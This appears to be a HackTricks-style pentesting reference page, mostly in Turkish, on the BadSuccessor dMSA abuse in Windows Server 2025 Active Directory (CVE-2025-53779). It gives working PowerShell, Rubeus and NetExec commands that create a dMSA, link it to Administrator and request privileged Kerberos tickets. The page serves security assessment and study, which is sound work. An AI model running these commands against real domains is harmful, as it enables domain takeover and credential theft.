# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

**BadSuccessor**, **Windows Server 2025**'te tanıtılan **delegated Managed Service Account** (**dMSA**) migration workflow'ünü abuse eder. Bir dMSA, **`msDS-ManagedAccountPrecededByLink`** üzerinden legacy bir account'a bağlanabilir ve **`msDS-DelegatedMSAState`** içinde saklanan migration state'leri arasında taşınabilir. Bir attacker, writable bir OU içinde dMSA oluşturabilir ve bu attribute'ları kontrol edebilirse KDC, attacker-controlled dMSA için linked account'ın **authorization context**'iyle ticket'lar verebilir.<sup>[[2]](#references)</sup>

Pratikte bu, yalnızca delegated OU haklarına sahip düşük yetkili bir user'ın yeni bir dMSA oluşturup bunu `Administrator`'a yönlendirebileceği, migration state'ini tamamlayabileceği ve PAC'i **Domain Admins** gibi privileged group'ları içeren bir TGT elde edebileceği anlamına gelir.<sup>[[2]](#references)</sup>

## Önemli dMSA migration ayrıntıları

- dMSA, **Windows Server 2025** özelliğidir.
- `Start-ADServiceAccountMigration`, migration'ı **started** state'ine ayarlar.
- `Complete-ADServiceAccountMigration`, migration'ı **completed** state'ine ayarlar.
- `msDS-DelegatedMSAState = 1`, migration'ın başlatıldığı anlamına gelir.
- `msDS-DelegatedMSAState = 2`, migration'ın tamamlandığı anlamına gelir.
- Legitimate migration sırasında dMSA'nın superseded account'ın yerini transparently alması amaçlanır; bu nedenle KDC/LSA, önceki account'ın zaten sahip olduğu access'i korur.<sup>[[3]](#references)</sup>

Microsoft Learn ayrıca migration sırasında original account'ın dMSA'ya bağlandığını ve dMSA'nın eski account'ın access edebildiği kaynaklara access etmesinin amaçlandığını belirtir.<sup>[[3]](#references)</sup> BadSuccessor'ın abuse ettiği security assumption budur.<sup>[[2]](#references)</sup>

## Gereksinimler

1. **dMSA'nın mevcut olduğu** bir domain; bu, AD tarafında **Windows Server 2025** desteğinin mevcut olduğu anlamına gelir.
2. Attacker'ın herhangi bir OU içinde `msDS-DelegatedManagedServiceAccount` object'leri **oluşturabilmesi** veya burada eşdeğer geniş child-object creation haklarına sahip olması.
3. Attacker'ın ilgili dMSA attribute'larını **yazabilmesi** veya yeni oluşturduğu dMSA'yı tamamen kontrol edebilmesi.
4. Attacker'ın domain-joined bir context'ten veya LDAP/Kerberos'a ulaşabilen bir tunnel üzerinden Kerberos ticket'ları request edebilmesi.<sup>[[2]](#references)</sup>

### Pratik kontroller

En net operator sinyali, domain/forest level'ı doğrulamak ve environment'ın yeni Server 2025 stack'ini zaten kullandığını onaylamaktır:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
`Windows2025Domain` ve `Windows2025Forest` gibi değerler görürseniz, **BadSuccessor / dMSA migration abuse** işlemini öncelikli olarak kontrol edin.

Ayrıca public tooling kullanarak dMSA oluşturma yetkisi devredilmiş yazılabilir OU'ları enumerate edebilirsiniz:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Kötüye kullanım akışı

1. Delegated create-child rights sahibi olduğunuz bir OU içinde bir dMSA oluşturun.
2. **`msDS-ManagedAccountPrecededByLink`** değerini `CN=Administrator,CN=Users,DC=corp,DC=local` gibi ayrıcalıklı bir hedefin DN değerine ayarlayın.
3. Migration işlemini tamamlandı olarak işaretlemek için **`msDS-DelegatedMSAState`** değerini `2` olarak ayarlayın.
4. Yeni dMSA için bir TGT isteyin ve döndürülen ticket'ı ayrıcalıklı servislere erişmek için kullanın.<sup>[[2]](#references)</sup>

PowerShell örneği:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket talebi / operasyonel araç örnekleri:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Neden bu yalnızca privilege escalation değildir

Meşru migration sırasında Windows, cutover işleminden önce önceki hesap için verilen ticket'ları da yeni dMSA'nın işleyebilmesi gerekir. dMSA ile ilişkili ticket materyali, **`KERB-DMSA-KEY-PACKAGE`** akışı içinde **güncel** ve **önceki** anahtarları içerebilir.<sup>[[2]](#references)</sup>

Saldırgan tarafından kontrol edilen sahte bir migration için bu davranış, BadSuccessor'ı şunlara dönüştürebilir:<sup>[[2]](#references)</sup>

- PAC içindeki ayrıcalıklı grup SID'lerini devralarak **Privilege escalation**.
- Önceki anahtar işleme mekanizması, güvenlik açığı bulunan workflow'larda predecessor'ın RC4/NT hash'ine eşdeğer materyali açığa çıkarabildiği için **Credential material exposure**.

Bu durum, tekniği hem doğrudan domain takeover hem de pass-the-hash veya daha kapsamlı credential compromise gibi takip eden operasyonlar için kullanışlı hâle getirir.

## Patch durumu hakkında notlar

Orijinal BadSuccessor davranışı **yalnızca teorik bir 2025 preview sorunu değildir**. Microsoft bu konuya **CVE-2025-53779** atamasını yaptı ve **Ağustos 2025**'te bir security update yayımladı.<sup>[[4]](#references)</sup> Bu saldırıyı şu durumlar için dokümante etmeye devam edin:

- **lab / CTF / assume-breach çalışmaları**
- **patch uygulanmamış Windows Server 2025 ortamları**
- **assessment sırasında OU delegations ve dMSA exposure doğrulaması**

dMSA mevcut olduğu için Windows Server 2025 domain'inin vulnerable olduğunu varsaymayın; patch seviyesini doğrulayın ve dikkatli test gerçekleştirin.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
